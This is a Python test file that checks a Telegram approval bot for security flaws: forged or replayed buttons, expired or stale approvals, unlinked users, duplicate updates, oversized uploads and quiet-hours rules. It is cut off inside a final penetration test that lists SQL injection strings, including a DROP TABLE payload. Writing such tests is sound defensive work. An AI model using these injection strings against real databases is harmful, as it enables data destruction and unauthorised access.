"""Comprehensive security and resilience test suite for Owner Messaging Channels (ADR-012, Phase 9).

Covers all Phase 9 security edge cases and penetration vectors specified in P9-05 & Session 07:
1. Case 1: Wrong user pressing forwarded button (INV-16, ADR-014).
2. Case 2: Replayed button concurrently / sequentially (INV-06, INV-16, AC-1).
3. Case 3: Expired approval button tap (INV-16, ADR-014).
4. Case 4: Edited subject / stale approval payload hash mismatch (INV-16, ADR-014).
5. Case 5: Unlinked user interactions (messages, commands, forged callbacks) (INV-03, INV-19).
6. Case 6: Duplicate update delivery idempotency (INV-06).
7. Case 7: Oversized media upload rejection (> 20 MB) (INV-11).
8. Case 8: Quiet hours enforcement and critical alert bypass (ADR-012, Phase 9).
9. Additional penetration & injection tests:
   - Malformed callback data resilience (empty, path traversal, oversized buffers, json injection).
   - SQL injection attempts in `/link <code>`.
   - Command injection heuristics in inbound message texts.
   - Cross-workspace isolation of tokens (INV-19).
"""

from __future__ import annotations

import contextlib
import io
import json
import uuid
from datetime import datetime, timedelta
from typing import Any
from urllib.parse import parse_qs, urlparse
from zoneinfo import ZoneInfo

import httpx
import pytest
from PIL import Image
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.agent.models import AccountAgent
from app.approvals import service as approvals_service
from app.approvals.action_tokens import ActionTokenService
from app.approvals.models import ActionToken
from app.audit.models import AuditLog
from app.content.models import MediaAsset
from app.core.clock import FrozenClock
from app.core.context import ActorRef, WorkspaceContext
from app.core.db import set_tenant_context
from app.identity.channels import ChannelLinkService
from app.identity.models import ChannelLink, User
from app.inbox.models import Conversation, Message, ReplyDraft
from app.integrations.channels.base import ChannelRecipient
from app.integrations.channels.telegram import (
    TelegramClient,
    process_update,
)
from app.integrations.channels.telegram.models import TelegramUpdate
from app.integrations.instagram.models import SocialAccount
from app.jobs.models import Job
from app.notifications.delivery_policy import (
    evaluate_delivery_policy,
)
from app.notifications.models import Notification
from tests.factories import workspace_with_members

# =============================================================================
# Test Helpers & Fixtures
# =============================================================================


def _make_test_jpeg(width: int = 100, height: int = 100, color: str = "blue") -> bytes:
    """Generate in-memory valid JPEG bytes for testing image processing."""
    img = Image.new("RGB", (width, height), color=color)
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    return buf.getvalue()


class MockTelegramHandler:
    """Mock HTTP transport for Telegram Bot API calls."""

    def __init__(self, photo_bytes: bytes | None = None) -> None:
        self.calls: list[dict[str, Any]] = []
        self.photo_bytes = photo_bytes or _make_test_jpeg()
        self.file_size_override: int | None = None

    def handle(self, request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        url_path = urlparse(url_str).path
        method_name = url_path.split("/")[-1]

        body: dict[str, Any] = {}
        if request.headers.get("content-type", "").startswith("application/json"):
            body = json.loads(request.content.decode("utf-8"))
        elif request.content:
            with contextlib.suppress(Exception):
                body = {
                    k: v[0]
                    for k, v in parse_qs(request.content.decode("utf-8", errors="ignore")).items()
                }

        call_record = {
            "method": request.method,
            "url": url_str,
            "api_method": method_name,
            "body": body,
        }
        self.calls.append(call_record)

        if method_name in ("sendMessage", "editMessageText"):
            return httpx.Response(
                200,
                json={
                    "ok": True,
                    "result": {
                        "message_id": len(self.calls) + 100,
                        "chat": {"id": body.get("chat_id", 123456), "type": "private"},
                        "text": body.get("text", ""),
                        "date": 1700000000,
                    },
                },
            )

        if method_name in ("answerCallbackQuery", "editMessageReplyMarkup"):
            return httpx.Response(200, json={"ok": True, "result": True})

        if method_name == "getFile":
            file_sz = (
                self.file_size_override
                if self.file_size_override is not None
                else len(self.photo_bytes)
            )
            return httpx.Response(
                200,
                json={
                    "ok": True,
                    "result": {
                        "file_id": body.get("file_id", "photo_sec_123"),
                        "file_unique_id": "u_sec_123",
                        "file_size": file_sz,
                        "file_path": "photos/security_test.jpg",
                    },
                },
            )

        if "file/bot" in url_str:
            return httpx.Response(200, content=self.photo_bytes)

        return httpx.Response(200, json={"ok": True, "result": {}})


def _setup_linked_owner(
    db_session: Session,
    clock: FrozenClock,
    channel_user_id: str = "77001",
    name: str = "Security Salon",
) -> tuple[Any, User, ChannelLink]:
    """Helper to provision workspace, owner, and active ChannelLink."""
    ws, users = workspace_with_members(db_session, name=name)
    owner = users["owner"]
    set_tenant_context(db_session, ws.id)

    ctx = WorkspaceContext(
        workspace_id=ws.id,
        actor=ActorRef.user(owner.id),
        role="owner",
        timezone=ws.timezone,
        locale="tr",
        is_demo=False,
    )
    code, _ = ChannelLinkService.generate_link_code(db_session, clock, ctx, channel="telegram")
    link = ChannelLinkService.redeem_link_code(
        db_session,
        clock,
        channel="telegram",
        channel_user_id=channel_user_id,
        channel_chat_id=channel_user_id,
        raw_code=code,
        channel_username="owner_user",
    )
    return ws, owner, link


def _make_social_account(
    db_session: Session, ws_id: uuid.UUID, username: str = "security_account"
) -> SocialAccount:
    social = SocialAccount(
        id=uuid.uuid4(),
        workspace_id=ws_id,
        platform="instagram",
        provider_kind="mock",
        external_account_id=f"ext_{uuid.uuid4().hex[:12]}",
        username=username,
        status="connected",
        capabilities={},
        granted_scopes=[],
    )
    db_session.add(social)
    db_session.flush()

    agent = db_session.scalar(
        select(AccountAgent).where(
            AccountAgent.workspace_id == ws_id,
            AccountAgent.social_account_id == social.id,
        )
    )
    if agent is None:
        agent = AccountAgent(
            id=uuid.uuid4(),
            workspace_id=ws_id,
            social_account_id=social.id,
            controller_mode="agent",
            state="active",
        )
        db_session.add(agent)
        db_session.flush()
    return social


def _make_callback_query_update(
    update_id: int,
    callback_data: str,
    user_id: int = 77001,
    chat_id: int = 77001,
    message_id: int = 1001,
    message_text: str = "Approval Request Notification",
) -> dict[str, Any]:
    return {
        "update_id": update_id,
        "callback_query": {
            "id": f"cb_{update_id}",
            "from": {
                "id": user_id,
                "is_bot": False,
                "first_name": "Security",
                "username": "sec_user",
            },
            "message": {
                "message_id": message_id,
                "date": 1700000000,
                "chat": {"id": chat_id, "type": "private"},
                "text": message_text,
            },
            "data": callback_data,
        },
    }


def _make_text_update(
    update_id: int,
    text: str,
    user_id: int = 77001,
    chat_id: int = 77001,
    username: str = "sec_user",
) -> dict[str, Any]:
    return {
        "update_id": update_id,
        "message": {
            "message_id": update_id * 10,
            "date": 1700000000,
            "chat": {"id": chat_id, "type": "private"},
            "from": {
                "id": user_id,
                "is_bot": False,
                "first_name": "Security",
                "username": username,
            },
            "text": text,
        },
    }


def _make_photo_update(
    update_id: int,
    file_id: str = "photo_sec_huge",
    file_size: int = 1024,
    caption: str | None = None,
    user_id: int = 77001,
    chat_id: int = 77001,
) -> dict[str, Any]:
    return {
        "update_id": update_id,
        "message": {
            "message_id": update_id * 10,
            "date": 1700000000,
            "chat": {"id": chat_id, "type": "private"},
            "from": {"id": user_id, "is_bot": False, "first_name": "Security"},
            "photo": [
                {
                    "file_id": file_id,
                    "file_unique_id": f"uniq_{file_id}",
                    "width": 1200,
                    "height": 900,
                    "file_size": file_size,
                }
            ],
            "caption": caption,
        },
    }


# =============================================================================
# 1. Case 1: Wrong User Pressing Forwarded Button (INV-16, ADR-014)
# =============================================================================


@pytest.mark.invariant("INV-16")
def test_security_case_1_wrong_user_forwarded_button_rejected(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 1: User B taps a forwarded action button generated for User A.

    Expected:
    - Rejected with unauthorized status and alert.
    - Token remains unconsumed (used_at IS NULL).
    - Approval remains pending.
    - Zero side effects (no send_reply job, no customer message sent).
    """
    ws, user_a, link_a = _setup_linked_owner(
        db_session, clock, channel_user_id="88001", name="Salon Alpha"
    )
    _, user_b, link_b = _setup_linked_owner(
        db_session, clock, channel_user_id="88002", name="Salon Beta"
    )

    set_tenant_context(db_session, ws.id)
    ctx_a = WorkspaceContext(
        workspace_id=ws.id,
        actor=ActorRef.user(user_a.id),
        role="owner",
        timezone=ws.timezone,
        locale="tr",
        is_demo=False,
    )

    social = _make_social_account(db_session, ws.id, username="alpha_account")
    conv = Conversation(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        social_account_id=social.id,
        customer_external_id="cust_case1",
        customer_handle="case1_customer",
        handling_mode="automatic",
        attention="none",
        last_inbound_at=clock.now(),
        is_simulated=True,
    )
    db_session.add(conv)
    db_session.flush()

    msg = Message(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        social_account_id=social.id,
        conversation_id=conv.id,
        direction="inbound",
        sender_kind="customer",
        external_message_id="msg_case1",
        text="Fiyat bilgisi alabilir miyim?",
        provider_timestamp=clock.now(),
        is_simulated=True,
    )
    db_session.add(msg)
    db_session.flush()

    draft = ReplyDraft(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        conversation_id=conv.id,
        covers_through_message_id=msg.id,
        source="ai",
        origin="legacy",
        status="pending_approval",
        decision="approval_required",
        text="Merhaba, standart seans ücretimiz 1.000 TL'dir.",
        version=1,
        created_by_actor_type="system",
        is_simulated=True,
    )
    db_session.add(draft)
    db_session.flush()

    approval = approvals_service.request(
        db_session,
        clock,
        ctx_a,
        kind="authorization",
        action="reply.send",
        subject_type="reply_draft",
        subject_id=draft.id,
        subject_version=draft.version,
        payload={"reply_draft_id": str(draft.id), "text": draft.text},
        summary={"draft_id": str(draft.id), "proposed_text": draft.text},
        required_permission="reply.approve",
        expires_at=clock.now() + timedelta(hours=24),
        is_simulated=True,
    )
    draft.approval_id = approval.id
    db_session.flush()

    # Generate token bound to User A
    token_approve = ActionTokenService.create_action_token(
        db_session, clock, ctx_a, approval, decision="approved", user_id=user_a.id
    )
    db_session.flush()

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    # User B (different user, channel_user_id="88002") presses forwarded button
    update_from_b = _make_callback_query_update(
        update_id=1001,
        callback_data=f"act:{token_approve}",
        user_id=int(link_b.channel_user_id),
        chat_id=int(link_b.channel_chat_id),
    )
    result = process_update(db_session, clock, update_from_b, client=tg_client)

    # 1. Action is reported as unauthorized
    assert result.action == "approval_unauthorized"

    # 2. Telegram callback answered with modal alert explaining lack of permission
    answer_calls = [c for c in mock_tg.calls if c["api_method"] == "answerCallbackQuery"]
    assert len(answer_calls) >= 1
    assert "yetkiniz yok / Unauthorized" in answer_calls[-1]["body"]["text"]
    assert answer_calls[-1]["body"]["show_alert"] is True

    # 3. Security state verification: token is NOT used, approval remains pending
    token_rec = db_session.scalar(select(ActionToken).where(ActionToken.approval_id == approval.id))
    assert token_rec is not None
    assert token_rec.used_at is None

    db_session.refresh(approval)
    assert approval.status == "pending"

    db_session.refresh(draft)
    assert draft.status == "pending_approval"

    # 4. Zero jobs dispatched
    jobs = db_session.scalars(select(Job).where(Job.workspace_id == ws.id)).all()
    assert len(jobs) == 0


# =============================================================================
# 2. Case 2: Replayed Button Protection (INV-06, INV-16, AC-1)
# =============================================================================


@pytest.mark.invariant("INV-06")
@pytest.mark.invariant("INV-16")
def test_security_case_2_replayed_button_protection(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 2: Token submitted multiple times concurrently or sequentially.

    Expected:
    - First decision succeeds and dispatches side effect.
    - Subsequent calls (identical token or sibling token) raise ALREADY_DECIDED.
    - Exactly one job and one state change (idempotency, AC-1).
    """
    ws, owner, link = _setup_linked_owner(db_session, clock, channel_user_id="88003")
    set_tenant_context(db_session, ws.id)

    ctx = WorkspaceContext(
        workspace_id=ws.id,
        actor=ActorRef.user(owner.id),
        role="owner",
        timezone=ws.timezone,
        locale="tr",
        is_demo=False,
    )

    social = _make_social_account(db_session, ws.id, username="replay_account")
    conv = Conversation(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        social_account_id=social.id,
        customer_external_id="cust_case2",
        customer_handle="replay_customer",
        handling_mode="automatic",
        attention="none",
        last_inbound_at=clock.now(),
        is_simulated=True,
    )
    db_session.add(conv)
    db_session.flush()

    msg = Message(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        social_account_id=social.id,
        conversation_id=conv.id,
        direction="inbound",
        sender_kind="customer",
        external_message_id="msg_case2",
        text="Açık mısınız?",
        provider_timestamp=clock.now(),
        is_simulated=True,
    )
    db_session.add(msg)
    db_session.flush()

    draft = ReplyDraft(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        conversation_id=conv.id,
        covers_through_message_id=msg.id,
        source="ai",
        origin="legacy",
        status="pending_approval",
        decision="approval_required",
        text="Evet, 20:00'ye kadar açığız.",
        version=1,
        created_by_actor_type="system",
        is_simulated=True,
    )
    db_session.add(draft)
    db_session.flush()

    approval = approvals_service.request(
        db_session,
        clock,
        ctx,
        kind="authorization",
        action="reply.send",
        subject_type="reply_draft",
        subject_id=draft.id,
        subject_version=draft.version,
        payload={"reply_draft_id": str(draft.id), "text": draft.text},
        summary={"draft_id": str(draft.id), "proposed_text": draft.text},
        required_permission="reply.approve",
        expires_at=clock.now() + timedelta(hours=24),
        is_simulated=True,
    )
    draft.approval_id = approval.id
    db_session.flush()

    token_approve = ActionTokenService.create_action_token(
        db_session, clock, ctx, approval, decision="approved", user_id=owner.id
    )
    token_reject = ActionTokenService.create_action_token(
        db_session, clock, ctx, approval, decision="rejected", user_id=owner.id
    )
    db_session.flush()

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    # 1. First button press: approve
    upd_1 = _make_callback_query_update(
        update_id=2001,
        callback_data=f"act:{token_approve}",
        user_id=int(link.channel_user_id),
        chat_id=int(link.channel_chat_id),
    )
    res_1 = process_update(db_session, clock, upd_1, client=tg_client)
    assert res_1.action == "approval_decided"

    db_session.refresh(approval)
    assert approval.status == "approved"
    jobs_after_first = db_session.scalars(
        select(Job).where(Job.workspace_id == ws.id, Job.job_type == "send_reply")
    ).all()
    assert len(jobs_after_first) == 1

    # 2. Replay same token sequentially
    upd_2 = _make_callback_query_update(
        update_id=2002,
        callback_data=f"act:{token_approve}",
        user_id=int(link.channel_user_id),
        chat_id=int(link.channel_chat_id),
    )
    res_2 = process_update(db_session, clock, upd_2, client=tg_client)
    assert res_2.action == "approval_already_decided"

    # 3. Sibling reject token press after item already decided
    upd_3 = _make_callback_query_update(
        update_id=2003,
        callback_data=f"act:{token_reject}",
        user_id=int(link.channel_user_id),
        chat_id=int(link.channel_chat_id),
    )
    res_3 = process_update(db_session, clock, upd_3, client=tg_client)
    assert res_3.action == "approval_already_decided"

    # Exactly 1 job exists, zero duplicate execution
    jobs_after_replay = db_session.scalars(
        select(Job).where(Job.workspace_id == ws.id, Job.job_type == "send_reply")
    ).all()
    assert len(jobs_after_replay) == 1

    # Invariant: Modal alert shown for replay
    alert_calls = [
        c
        for c in mock_tg.calls
        if c["api_method"] == "answerCallbackQuery" and c["body"].get("show_alert") is True
    ]
    assert len(alert_calls) >= 2
    assert "Already decided" in alert_calls[-1]["body"]["text"]


# =============================================================================
# 3. Case 3: Expired Approval Protection (INV-16, ADR-014)
# =============================================================================


@pytest.mark.invariant("INV-16")
def test_security_case_3_expired_approval_button_rejected(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 3: Action token tapped after approval expiry.

    Expected:
    - Returns APPROVAL_EXPIRED with modal alert.
    - Buttons are removed from message markup.
    - Zero side effects (no draft transition, no jobs).
    """
    ws, owner, link = _setup_linked_owner(db_session, clock, channel_user_id="88004")
    set_tenant_context(db_session, ws.id)

    ctx = WorkspaceContext(
        workspace_id=ws.id,
        actor=ActorRef.user(owner.id),
        role="owner",
        timezone=ws.timezone,
        locale="tr",
        is_demo=False,
    )

    approval = approvals_service.request(
        db_session,
        clock,
        ctx,
        kind="confirmation",
        action="command.update_fact",
        subject_type="owner_command",
        subject_id=uuid.uuid4(),
        subject_version=1,
        payload={"price": "250"},
        summary={"label": "Fiyat Güncelleme"},
        required_permission="knowledge.verify",
        expires_at=clock.now() + timedelta(minutes=30),
    )
    db_session.flush()

    token_approve = ActionTokenService.create_action_token(
        db_session, clock, ctx, approval, decision="approved", user_id=owner.id
    )
    db_session.flush()

    # Advance clock past expiry instant
    clock.advance(minutes=45)

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    upd = _make_callback_query_update(
        update_id=3001,
        callback_data=f"act:{token_approve}",
        user_id=int(link.channel_user_id),
        chat_id=int(link.channel_chat_id),
    )
    result = process_update(db_session, clock, upd, client=tg_client)

    assert result.action == "approval_expired"
    assert approval.status == "pending"  # Approval was never approved

    # Verified modal alert delivered
    answer_calls = [c for c in mock_tg.calls if c["api_method"] == "answerCallbackQuery"]
    assert len(answer_calls) >= 1
    assert (
        "Approval expired" in answer_calls[-1]["body"]["text"]
        or "süresi doldu" in answer_calls[-1]["body"]["text"]
    )
    assert answer_calls[-1]["body"]["show_alert"] is True

    # Verified buttons stripped from Telegram message
    reply_markup_calls = [c for c in mock_tg.calls if c["api_method"] == "editMessageReplyMarkup"]
    assert len(reply_markup_calls) >= 1

    # Zero jobs
    assert len(db_session.scalars(select(Job).where(Job.workspace_id == ws.id)).all()) == 0


# =============================================================================
# 4. Case 4: Edited Subject / Stale Approval (INV-16, ADR-014)
# =============================================================================


@pytest.mark.invariant("INV-16")
def test_security_case_4_edited_subject_stale_approval_rejected(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 4: Subject edited on web after approval requested; payload hash mismatch.

    Expected:
    - Decision rejected with APPROVAL_STALE.
    - User alerted that approval content has changed.
    - Buttons stripped from Telegram message.
    - Zero send side effects.
    """
    ws, owner, link = _setup_linked_owner(db_session, clock, channel_user_id="88005")
    set_tenant_context(db_session, ws.id)

    ctx = WorkspaceContext(
        workspace_id=ws.id,
        actor=ActorRef.user(owner.id),
        role="owner",
        timezone=ws.timezone,
        locale="tr",
        is_demo=False,
    )

    social = _make_social_account(db_session, ws.id, username="stale_sec_account")
    conv = Conversation(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        social_account_id=social.id,
        customer_external_id="cust_case4",
        customer_handle="stale_customer",
        handling_mode="automatic",
        attention="none",
        last_inbound_at=clock.now(),
        is_simulated=True,
    )
    db_session.add(conv)
    db_session.flush()

    msg = Message(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        social_account_id=social.id,
        conversation_id=conv.id,
        direction="inbound",
        sender_kind="customer",
        external_message_id="msg_case4",
        text="Randevu müsaitliği var mı?",
        provider_timestamp=clock.now(),
        is_simulated=True,
    )
    db_session.add(msg)
    db_session.flush()

    draft = ReplyDraft(
        id=uuid.uuid4(),
        workspace_id=ws.id,
        conversation_id=conv.id,
        covers_through_message_id=msg.id,
        source="ai",
        origin="legacy",
        status="pending_approval",
        decision="approval_required",
        text="Evet, yarın saat 14:00 uygun.",
        version=1,
        created_by_actor_type="system",
        is_simulated=True,
    )
    db_session.add(draft)
    db_session.flush()

    approval = approvals_service.request(
        db_session,
        clock,
        ctx,
        kind="authorization",
        action="reply.send",
        subject_type="reply_draft",
        subject_id=draft.id,
        subject_version=draft.version,
        payload={"draft_id": str(draft.id), "text": draft.text},
        summary={"draft_id": str(draft.id), "proposed_text": draft.text},
        required_permission="reply.approve",
        expires_at=clock.now() + timedelta(hours=24),
    )
    draft.approval_id = approval.id
    db_session.flush()

    token_approve = ActionTokenService.create_action_token(
        db_session, clock, ctx, approval, decision="approved", user_id=owner.id
    )
    db_session.flush()

    # Web operator edits draft: changes proposed text and increments version
    draft.text = "Üzgünüz, yarın 14:00 doldu. 16:00 uygun mudur?"
    draft.version = 2
    db_session.flush()

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    # Owner taps original Telegram button with stale token
    upd = _make_callback_query_update(
        update_id=4001,
        callback_data=f"act:{token_approve}",
        user_id=int(link.channel_user_id),
        chat_id=int(link.channel_chat_id),
    )
    result = process_update(db_session, clock, upd, client=tg_client)

    # 1. Action reported as stale
    assert result.action == "approval_stale"

    # 2. Alert delivered to user
    alert_calls = [c for c in mock_tg.calls if c["api_method"] == "answerCallbackQuery"]
    assert len(alert_calls) >= 1
    assert (
        "Approval stale" in alert_calls[-1]["body"]["text"]
        or "içeriği değişti" in alert_calls[-1]["body"]["text"]
    )
    assert alert_calls[-1]["body"]["show_alert"] is True

    # 3. Draft remains pending, no send_reply jobs created
    db_session.refresh(draft)
    assert draft.status == "pending_approval"
    jobs = db_session.scalars(
        select(Job).where(Job.workspace_id == ws.id, Job.job_type == "send_reply")
    ).all()
    assert len(jobs) == 0


# =============================================================================
# 5. Case 5: Unlinked User Interaction Protection (INV-03, INV-19)
# =============================================================================


@pytest.mark.invariant("INV-03")
@pytest.mark.invariant("INV-19")
def test_security_case_5_unlinked_user_interaction(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 5: Unlinked user interactions (messages, commands, forged callback queries).

    Expected:
    - Zero business logic executed (no tasks, no commands, no approvals touched).
    - Polite linking prompt returned for messages and status commands.
    - Unauthorized / failure alerts returned for forged or unauthorized callback queries.
    """
    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    unlinked_user_id = 999999
    unlinked_chat_id = 999999

    # 5A: Plain chat message from stranger
    upd_text = _make_text_update(
        update_id=5001,
        text="Can I book a massage session for 2 PM?",
        user_id=unlinked_user_id,
        chat_id=unlinked_chat_id,
    )
    res_text = process_update(db_session, clock, upd_text, client=tg_client)
    assert res_text.action == "unlinked_prompt"
    assert "/link" in mock_tg.calls[-1]["body"]["text"]

    # 5B: Status command from unlinked stranger
    upd_status = _make_text_update(
        update_id=5002,
        text="/status",
        user_id=unlinked_user_id,
        chat_id=unlinked_chat_id,
    )
    res_status = process_update(db_session, clock, upd_status, client=tg_client)
    assert res_status.action == "status"
    assert "not linked" in mock_tg.calls[-1]["body"]["text"].lower()

    # 5C: Arbitrary unknown command from unlinked stranger
    upd_cmd = _make_text_update(
        update_id=5003,
        text="/admin_eval_script",
        user_id=unlinked_user_id,
        chat_id=unlinked_chat_id,
    )
    res_cmd = process_update(db_session, clock, upd_cmd, client=tg_client)
    assert res_cmd.action == "unlinked_prompt"

    # 5D: Forged action token callback data
    upd_forged = _make_callback_query_update(
        update_id=5004,
        callback_data="act:forged_nonexistent_token_hex_12345",
        user_id=unlinked_user_id,
        chat_id=unlinked_chat_id,
    )
    res_forged = process_update(db_session, clock, upd_forged, client=tg_client)
    assert res_forged.action == "approval_failed"

    # Invariant: Zero side effects or records in jobs / approvals
    assert db_session.scalar(select(func.count(Job.id))) == 0


# =============================================================================
# 6. Case 6: Duplicate Update Delivery Deduplication (INV-06)
# =============================================================================


@pytest.mark.invariant("INV-06")
def test_security_case_6_duplicate_update_delivery_deduplication(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 6: Telegram webhook delivers same update_id 3 times in rapid succession.

    Expected:
    - First delivery processes and records update_id.
    - Second and third deliveries detect duplicate and bypass execution.
    - Exactly 1 response sent and 1 telegram_updates row recorded (INV-06).
    """
    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    update_id = 60001
    upd = _make_text_update(
        update_id=update_id,
        text="/start",
        user_id=88006,
        chat_id=88006,
    )

    # First attempt: processed
    res_1 = process_update(db_session, clock, upd, client=tg_client)
    assert res_1.status == "processed"
    assert res_1.action == "start"
    assert len(mock_tg.calls) == 1

    # Second attempt: detected as duplicate
    res_2 = process_update(db_session, clock, upd, client=tg_client)
    assert res_2.status == "duplicate"
    assert res_2.action == "duplicate"
    assert len(mock_tg.calls) == 1  # No additional message sent

    # Third attempt: detected as duplicate
    res_3 = process_update(db_session, clock, upd, client=tg_client)
    assert res_3.status == "duplicate"
    assert res_3.action == "duplicate"
    assert len(mock_tg.calls) == 1

    # Database table contains exactly 1 record for update_id
    records = db_session.scalars(
        select(TelegramUpdate).where(TelegramUpdate.update_id == update_id)
    ).all()
    assert len(records) == 1


# =============================================================================
# 7. Case 7: Oversized Media Upload Protection (INV-11)
# =============================================================================


@pytest.mark.invariant("INV-11")
def test_security_case_7_oversized_media_upload_rejected(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 7: User uploads photo > 20 MB.

    Expected:
    - Fast rejection before file storage.
    - Returns MEDIA_TOO_LARGE / photo_rejected_size.
    - Zero files stored in MediaAsset ledger.
    - Audit log entry recorded with reason 'too_large'.
    """
    ws, _, link = _setup_linked_owner(db_session, clock, channel_user_id="88007")

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    # 25 MB payload metadata
    twenty_five_mb = 25 * 1024 * 1024
    upd_photo = _make_photo_update(
        update_id=7001,
        file_id="photo_oversized_25mb",
        file_size=twenty_five_mb,
        caption="Lütfen bu story'yi paylaş",
        user_id=int(link.channel_user_id),
        chat_id=int(link.channel_chat_id),
    )

    result = process_update(db_session, clock, upd_photo, client=tg_client)

    # 1. Action is reported as rejected due to size
    assert result.action == "photo_rejected_size"

    # 2. Outbound message explains 20 MB limit
    assert len(mock_tg.calls) == 1
    assert "20 MB" in mock_tg.calls[0]["body"]["text"]

    # 3. Media storage invariant: 0 MediaAsset rows created
    media_count = db_session.scalar(
        select(func.count(MediaAsset.id)).where(MediaAsset.workspace_id == ws.id)
    )
    assert media_count == 0

    # 4. Audit log records rejection
    audit_row = db_session.scalar(
        select(AuditLog).where(
            AuditLog.workspace_id == ws.id,
            AuditLog.action == "media.rejected",
        )
    )
    assert audit_row is not None
    assert audit_row.metadata_.get("reason") == "too_large"
    assert audit_row.metadata_.get("byte_size") == twenty_five_mb


# =============================================================================
# 8. Case 8: Quiet Hours Enforcement & Critical Alert Bypass (ADR-012)
# =============================================================================


def test_security_case_8_quiet_hours_enforcement_and_critical_bypass() -> None:
    """Case 8: Non-critical notifications suppressed in quiet window; critical alerts bypass."""
    recipient = ChannelRecipient(
        user_id=uuid.uuid4(),
        workspace_id=uuid.uuid4(),
        channel_user_id="88008",
        channel_chat_id="88008",
        timezone="Europe/Istanbul",  # UTC+3
        ui_locale="tr",
    )

    # Local 23:30 in Istanbul (20:30 UTC): well inside quiet hours 22:00-08:00
    quiet_dt_utc = datetime(2026, 11, 4, 20, 30, tzinfo=ZoneInfo("UTC"))
    clock = FrozenClock(quiet_dt_utc)

    # 1. Non-critical report notification during quiet hours -> Suppressed
    notif_routine = Notification(
        id=uuid.uuid4(),
        workspace_id=recipient.workspace_id,
        recipient_user_id=recipient.user_id,
        type="report.daily_ready",
        severity="info",
        params={"summary": "Daily report ready"},
        created_at=quiet_dt_utc,
    )
    dec_routine = evaluate_delivery_policy(notif_routine, recipient, clock)
    assert dec_routine.should_deliver is False
    assert dec_routine.status == "skipped_quiet_hours"
    assert dec_routine.is_quiet_hours is True
    assert dec_routine.bypassed_quiet_hours is False

    # 2. Operational warning during quiet hours -> Suppressed
    notif_warn = Notification(
        id=uuid.uuid4(),
        workspace_id=recipient.workspace_id,
        recipient_user_id=recipient.user_id,
        type="conversation.needs_human",
        severity="warning",
        params={"customer": "john_doe"},
        created_at=quiet_dt_utc,
    )
    dec_warn = evaluate_delivery_policy(notif_warn, recipient, clock)
    assert dec_warn.should_deliver is False
    assert dec_warn.status == "skipped_quiet_hours"

    # 3. Critical integration error during quiet hours -> Bypasses quiet hours
    notif_critical = Notification(
        id=uuid.uuid4(),
        workspace_id=recipient.workspace_id,
        recipient_user_id=recipient.user_id,
        type="system.integration_error",
        severity="critical",
        params={"service": "meta_instagram"},
        created_at=quiet_dt_utc,
    )
    dec_crit = evaluate_delivery_policy(notif_critical, recipient, clock)
    assert dec_crit.should_deliver is True
    assert dec_crit.status == "pending"
    assert dec_crit.is_quiet_hours is True
    assert dec_crit.bypassed_quiet_hours is True
    assert "critical" in dec_crit.reason

    # 4. Account reauth critical notification -> Bypasses quiet hours
    notif_reauth = Notification(
        id=uuid.uuid4(),
        workspace_id=recipient.workspace_id,
        recipient_user_id=recipient.user_id,
        type="account.needs_reauth",
        severity="high",
        params={"account_id": "acc_123"},
        created_at=quiet_dt_utc,
    )
    dec_reauth = evaluate_delivery_policy(notif_reauth, recipient, clock)
    assert dec_reauth.should_deliver is True
    assert dec_reauth.bypassed_quiet_hours is True

    # 5. Urgent approval expiring soon (< 2h) -> Bypasses quiet hours
    urgent_expiry = quiet_dt_utc + timedelta(minutes=45)
    notif_urgent_app = Notification(
        id=uuid.uuid4(),
        workspace_id=recipient.workspace_id,
        recipient_user_id=recipient.user_id,
        type="approval.requested",
        severity="high",
        params={"action": "reply.send", "expires_at": urgent_expiry.isoformat()},
        created_at=quiet_dt_utc,
    )
    dec_urgent_app = evaluate_delivery_policy(notif_urgent_app, recipient, clock)
    assert dec_urgent_app.should_deliver is True
    assert dec_urgent_app.bypassed_quiet_hours is True
    assert "approval_expiring_soon" in dec_urgent_app.reason

    # 6. Active daytime check (14:00 local time = 11:00 UTC) -> Pushed normally
    day_dt_utc = datetime(2026, 11, 4, 11, 0, tzinfo=ZoneInfo("UTC"))
    clock_day = FrozenClock(day_dt_utc)
    dec_day = evaluate_delivery_policy(notif_warn, recipient, clock_day)
    assert dec_day.should_deliver is True
    assert dec_day.is_quiet_hours is False
    assert dec_day.bypassed_quiet_hours is False


# =============================================================================
# 9. Additional Penetration & Injection Tests (SQLi, Callback, Command Injection)
# =============================================================================


def test_security_sql_injection_attempts_in_link_code(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Penetration: Inbound /link commands with malicious SQL payloads are safely parameterized."""
    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    malicious_inputs = [
        "'; DROP TABLE channel_links; --",
        "' OR '1'='1",
        "' OR 1=1 --",
